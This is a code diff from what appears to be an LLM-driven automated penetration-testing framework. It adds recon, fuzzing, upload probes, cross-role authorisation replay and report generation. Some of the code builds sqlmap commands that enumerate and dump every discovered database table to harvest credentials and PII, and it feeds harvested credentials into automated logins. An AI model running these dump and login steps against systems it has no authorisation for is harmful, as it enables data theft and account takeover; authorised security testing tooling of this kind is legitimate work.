+        """Phase 1.1 + 1.2: extract routes from JS bundles + monitor DOM sinks.
+
+        Bundle analyzer downloads every same-origin JS URL discovered in RECON,
+        greps for URL / route patterns, and drops the new paths onto
+        ctx.endpoints. DOM sink monitor loads each candidate URL in headless
+        Chromium with a unique canary and reports the canary's arrival in any
+        client-side sink (document.write, innerHTML, eval, DOM XSS surface).
+
+        Both are best-effort — missing Playwright / bad response / no bundles
+        simply logs a debug line."""
+        base = getattr(self.ctx, "target", None) or getattr(self, "target", None)
+        if not base:
+            return
+        try:
+            from core.exploitation.js_bundle_analyzer import analyze_bundles
+            routes = await analyze_bundles(self.ctx, base)
+            if routes:
+                logger.info(f"[BundleAnalyzer] extracted {len(routes)} route(s) from JS bundles")
+        except Exception as e:
+            logger.debug(f"[BundleAnalyzer] skipped: {e}")
+        try:
+            from core.exploitation.dom_sink_monitor import run_dom_sink_monitor
+            findings = await run_dom_sink_monitor(self.ctx, base)
+            for f in findings or []:
+                if isinstance(f, dict):
+                    f.setdefault("phase", "recon")
+                    f.setdefault("tool", "dom_sink_monitor")
+                    if hasattr(self.ctx, "add_vulnerability"):
+                        self.ctx.add_vulnerability(f)
+            logger.info(f"[DOMSinkMonitor] found {len(findings or [])} client-side sink hit(s)")
+        except Exception as e:
+            logger.debug(f"[DOMSinkMonitor] skipped: {e}")
+
+    async def _run_semantic_fuzz_with_coverage(self) -> None:
+        """Phase 1.4 + 4.1: run the semantic-API fuzzer with a coverage
+        tracker gating which mutations get kept. Requires captured requests
+        on ctx; skips gracefully otherwise."""
+        try:
+            from core.exploitation.semantic_api_fuzzer import run_semantic_fuzz
+            from core.exploitation.coverage_tracker import CoverageTracker
+        except Exception as e:
+            logger.debug(f"[SemanticFuzz] import failed: {e}")
+            return
+        if not getattr(self.ctx, "captured_requests", None):
+            logger.info("[SemanticFuzz] no captured_requests — skipping")
+            return
+        tracker = CoverageTracker()
+        # Expose the tracker to the fuzzer via ctx so it can filter blind
+        # mutations. The fuzzer treats a missing tracker as no-op.
+        self.ctx.coverage_tracker = tracker
+        findings = await run_semantic_fuzz(self.ctx)
+        for f in findings or []:
+            if isinstance(f, dict):
+                f.setdefault("phase", "exploit")
+                f.setdefault("tool", "semantic_api_fuzzer")
+                if hasattr(self.ctx, "add_vulnerability"):
+                    self.ctx.add_vulnerability(f)
+        logger.info(f"[SemanticFuzz] {len(findings or [])} finding(s); "
+                    f"coverage across {len(tracker._buckets)} endpoint bucket(s)")
+
+    async def _run_format_probes(self) -> None:
+        """Phase 2.2: try every registered format probe against any upload
+        endpoint we know about. The probes generate payloads only — they do
+        NOT upload; the AgenticExecutor is responsible for the HTTP send
+        under scope validation."""
+        try:
+            from core.exploitation.format_probes import available_probes, get_probe
+            from core.orchestration.agent_scratchpad import get_scratchpad
+        except Exception as e:
+            logger.debug(f"[FormatProbes] import failed: {e}")
+            return
+        scan_id = getattr(self, "_scan_id", None) or "unscoped"
+        # Filter to endpoints that look like uploads or dataset-preview surfaces.
+        endpoints = list(getattr(self.ctx, "endpoints", []) or [])
+        upload_eps = [e for e in endpoints
+                      if any(k in str(e).lower()
+                             for k in ("upload", "dataset", "preview",
+                                       "import", "attachment", "file"))]
+        if not upload_eps:
+            logger.info("[FormatProbes] no upload/preview endpoints — skipping")
+            return
+        pad = get_scratchpad(scan_id, "format-probes")
+        probes = available_probes()
+        logger.info(f"[FormatProbes] queueing {len(probes)} probe(s) × "
+                    f"{len(upload_eps)} endpoint(s)")
+        for probe_name in probes:
+            try:
+                probe = get_probe(probe_name)()
+            except Exception as e:
+                logger.debug(f"[FormatProbes] probe {probe_name} build failed: {e}")
+                continue
+            if not probe.get("payload"):
+                continue
+            for ep in upload_eps[:5]:
+                pad.post("tool", {
+                    "probe": probe_name,
+                    "endpoint": str(ep),
+                    "filename": probe.get("filename"),
+                    "mime": probe.get("mime"),
+                    "sink_signature": probe.get("sink_signature", []),
+                    "rationale": probe.get("rationale", ""),
+                }, topic="format_probe_ready")
+
+    async def _run_authz_phase(self) -> None:
+        """Cross-role replay: run every captured authenticated request under
+        every other role's session; flag any 2xx that reveals another user's
+        data or an admin-only marker. See core/exploitation/cross_role_replay.py
+        for the actual heuristics.
+        """
+        try:
+            from core.exploitation.cross_role_replay import run_cross_role_replay
+        except Exception as e:
+            logger.debug(f"[AUTHZ] cross_role_replay import failed: {e}")
+            return
+        captured = getattr(self.ctx, "captured_requests", []) or []
+        identities = []
+        try:
+            identities = list(getattr(self.identity_manager, "identities", []) or [])
+        except Exception:
+            pass
+        if not captured:
+            logger.info("[AUTHZ] no captured_requests on ctx — skipping cross-role replay")
+            return
+        if len(identities) < 2:
+            logger.info(f"[AUTHZ] only {len(identities)} identity/identities discovered — "
+                        f"cross-role replay needs at least 2 to compare")
+            return
+        logger.info(f"[AUTHZ] cross-role replay: {len(captured)} requests × "
+                    f"{len(identities)} identities")
+        findings = await run_cross_role_replay(self.ctx)
+        for f in findings or []:
+            if isinstance(f, dict):
+                f.setdefault("phase", "authz")
+                f.setdefault("tool", "cross_role_replay")
+                if hasattr(self.ctx, "add_vulnerability"):
+                    self.ctx.add_vulnerability(f)
+        logger.info(f"[AUTHZ] cross-role replay produced {len(findings or [])} finding(s)")
 
     def _load_phase_prompt(self, phase: str) -> Optional[str]:
         """Load phase-specific prompt from file if available"""
@@ -5419,21 +6073,12 @@ class CentralBrain(
             base = f"https://{base}"
         from urllib.parse import urlparse as _up
         base_host = _up(base).netloc
-        login_urls = set()
-        LOGIN_HINTS = ("/rest/user/login", "/api/login", "/login", "/signin",
-                       "/session", "/auth/login", "/oauth/token", "/api/v1/login")
-        for r in (getattr(self.ctx, "captured_requests", []) or []):
-            u = r.get("url") if isinstance(r, dict) else getattr(r, "url", "")
-            if u and any(h in u.lower() for h in LOGIN_HINTS):
-                login_urls.add(u.split("?")[0])
-        for ep in (getattr(self.ctx, "endpoint_catalog", []) or []):
-            u = ep.get("url") if isinstance(ep, dict) else ""
-            if u and any(h in u.lower() for h in LOGIN_HINTS):
-                login_urls.add(u.split("?")[0])
-        # Fall back to the Juice-Shop / common default on the base host
-        if not login_urls:
-            login_urls.add(f"{base.rstrip('/')}/rest/user/login")
-            login_urls.add(f"{base.rstrip('/')}/api/login")
+        # Generic endpoint discovery — reads everything the crawler + ffuf +
+        # captured requests found, classifies as "login" role, falls back to a
+        # generic industry-standard list (/login, /signin, /oauth/token, ...)
+        # only when nothing was discovered on this target.
+        from core.common.endpoint_hints import discover_endpoints
+        login_urls = set(discover_endpoints(self.ctx, "login", max_results=20))
 
         logger.info(f"[AutoLogin] Trying {len(candidates)} plaintext cred(s) against {len(login_urls)} login endpoint(s)")
         import httpx as _httpx, json as _json, base64 as _b64
@@ -5576,17 +6221,35 @@ class CentralBrain(
         except Exception:
             return
         added_creds = 0
-        # Expert mode: dump every confirmed SQLi endpoint, all known-user tables +
-        # --dump-all schema enumeration. Level 5/risk 3, every technique.
+        # Expert mode, target-agnostic: enumerate DBs + tables first, then
+        # dump every discovered table (no hardcoded table names). Any table
+        # that looks like it holds credentials/PII surfaces creds; the rest
+        # populate post_exploit_data as intelligence.
+        import re as _re_local
         for url in sqli_targets:
             try:
-                # First: enumerate schema so we don't guess table names
                 enum_cmd = (f"sqlmap -u {url!r} --batch --level=5 --risk=3 "
                             f"--random-agent --timeout=30 --retries=2 --technique=BEUSTQ "
                             f"--dbs --tables --threads=4")
-                await executor.execute(enum_cmd, timeout=300)
-                for table in ("users", "Users", "user", "User", "accounts", "Account",
-                              "customers", "members", "admins"):
+                enum_res = await executor.execute(enum_cmd, timeout=300)
+                enum_out = str(enum_res.get("stdout") or "") if isinstance(enum_res, dict) else str(enum_res)
+                # Parse sqlmap's tables output — lines like `| users |` or `[*] users`
+                discovered_tables = set()
+                for m in _re_local.finditer(r"^\s*\|\s*([A-Za-z_][A-Za-z0-9_]{1,63})\s*\|", enum_out, _re_local.MULTILINE):
+                    discovered_tables.add(m.group(1))
+                for m in _re_local.finditer(r"^\s*\[\*\]\s*([A-Za-z_][A-Za-z0-9_]{1,63})\s*$", enum_out, _re_local.MULTILINE):
+                    discovered_tables.add(m.group(1))
+                # No tables enumerated? Fall back to --dump-all (sqlmap picks
+                # them itself) so we still exfil something without guessing.
+                if not discovered_tables:
+                    fallback_cmd = (f"sqlmap -u {url!r} --batch --level=5 --risk=3 "
+                                    f"--random-agent --timeout=30 --retries=2 --technique=BEUSTQ "
+                                    f"--dump-all --exclude-sysdbs --threads=4")
+                    await executor.execute(fallback_cmd, timeout=600)
+                    continue
+                logger.info(f"[SQLiDump] Enumerated {len(discovered_tables)} table(s) on {url}: "
+                            f"{sorted(discovered_tables)[:10]}...")
+                for table in sorted(discovered_tables):
                     cmd = (f"sqlmap -u {url!r} --batch --level=5 --risk=3 "
                            f"--random-agent --timeout=30 --retries=2 --technique=BEUSTQ "
                            f"-T {table} --dump --threads=4")
@@ -5938,18 +6601,59 @@ CRITICAL RULES:
                 "dedup": dedup_summary}
 
     async def _generate_report(self):
-        """LLM generates final report"""
-        summary = self.ctx.get_full_summary(max_chars=8000)
-        summary_str = json.dumps(summary, default=str) if isinstance(summary, dict) else str(summary)
+        # Attack-chain intelligence: compose distinct exploitation paths from
+        # the scan artefacts (SQLi→dump→crack→login→IDOR chains, etc.)
+        try:
+            from core.reporting.chain_intelligence import synthesize_chains
+            await synthesize_chains(self._scan_id)
+        except Exception as _e:
+            logger.warning(f"[ChainIntel] synthesis failed (non-fatal): {_e}")
 
-        # Generate executive summary via LLM
+        """LLM generates final report.
+
+        Token-savings: prefer the LLM's OWN phase-by-phase summaries recorded
+        during the scan (scan_llm_memory) over dumping raw context. Uses the
+        SMALL tier because this is prose summarisation, not reasoning — the
+        LARGE reasoning-model tier tripled cost with no quality gain.
+        """
+        # 1. Reuse recorded per-phase summaries the scan-time LLM produced
+        try:
+            from core.database.pg_store import LLMMemoryRepo
+            mem_rows = LLMMemoryRepo.get_by_scan(self._scan_id, kind="summary", limit=30)
+        except Exception:
+            mem_rows = []
+        if mem_rows:
+            memory_txt = "\n\n".join(f"### {m.get('phase','phase')}\n{(m.get('content') or '').strip()}"
+                                       for m in mem_rows if (m.get("content") or "").strip())
+        else:
+            memory_txt = ""
+        # 2. Compact fact snapshot — just counts + top vuln titles (no full details)
+        v_list = self.ctx.vulnerabilities or []
+        sev_counts: Dict[str, int] = {}
+        for v in v_list:
+            s = (v.get("severity") or "INFO").upper()
+            sev_counts[s] = sev_counts.get(s, 0) + 1
+        top_vulns = [v.get("title", "") for v in v_list
+                     if (v.get("severity") or "").upper() in ("CRITICAL", "HIGH")][:15]
+        fact_snapshot = {
+            "target": self.ctx.target,
+            "severity_counts": sev_counts,
+            "top_high_critical": top_vulns,
+            "attack_chains_count": len(self.ctx.attack_chains or []),
+            "exploit_results_count": len(self.ctx.exploit_results or []),
+            "harvested_creds_count": len(self.ctx.harvested_creds or []),
+        }
+        # 3. SMALL tier — this is summarisation, not reasoning
         exec_summary = await self.llm.generate(
-            f"Write a professional executive summary for this penetration test.\n\n"
-            f"DATA:\n{summary_str}\n\n"
-            f"Include: overall risk, key findings, attack chains, recommendations.\n"
-            f"Be concise (3 paragraphs max).",
-            tier=TaskTier.LARGE,
-            max_tokens=4096,
+            "Write a 3-paragraph professional executive summary for this pentest. "
+            "Cover: overall risk posture, key finding categories, recommendations. "
+            "Use the scan-time analyst notes as your primary source; the fact "
+            "snapshot is only for citing exact counts.\n\n"
+            f"SCAN-TIME ANALYST NOTES:\n{memory_txt or '(no phase summaries recorded)'}\n\n"
+            f"FACT SNAPSHOT: {json.dumps(fact_snapshot, default=str)}\n\n"
+            "Be concise (3 paragraphs max, ~250 words total).",
+            tier=TaskTier.SMALL,
+            max_tokens=800,
         )
 
         # ── Finding validation + compliance mapping (production-grade layer) ──
